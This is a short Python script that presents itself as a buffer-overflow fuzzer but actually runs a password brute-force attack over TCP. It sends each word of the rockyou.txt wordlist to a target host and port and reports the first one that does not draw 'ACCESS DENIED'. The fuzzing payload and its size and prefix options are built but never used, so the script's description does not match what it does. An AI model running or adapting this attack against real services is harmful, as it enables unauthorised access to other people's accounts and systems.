#!/usr/bin/env python3

import socket, time, sys, argparse

if __name__== "__main__":
    parser = argparse.ArgumentParser(description="Fuzz that buffer, baby ;)")
    parser.add_argument('-H','--host', help='Hostname to fuzz', required=True)
    parser.add_argument('-p','--port', help='Host port to fuzz', required=True, type=int)
    parser.add_argument('-t','--timeout', help='Request timeout seconds', default=5, type=int)
    parser.add_argument('-pr','--prefix', help = 'Payload prefix' , default='')
    parser.add_argument('-s','--size', help='Payload incremental step', default=100, type=int)
    args = parser.parse_args()

    

    ip = args.host
    port = args.port
    timeout = args.timeout
    prefix = args.prefix
    size = args.size
    payload = prefix + "A" * size
    
    with open('/usr/share/wordlists/rockyou.txt','r') as wl:
        for pwd in wl:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout)
                    s.connect((ip,port))
                    s.recv(1024)
                    
                    print("PWD:", pwd)
                    s.send(pwd.encode("latin-1"))
                    res = s.recv(1024)
                    res = res.decode('latin-1')
                    print(res)
                    if 'ACCESS DENIED' not in res:
                        print('FOUND:', pwd)
                        sys.exit(0)
            except BaseException as ex:
                print(ex)
                print('DEAD WITH:', pwd)
                sys.exit(0)
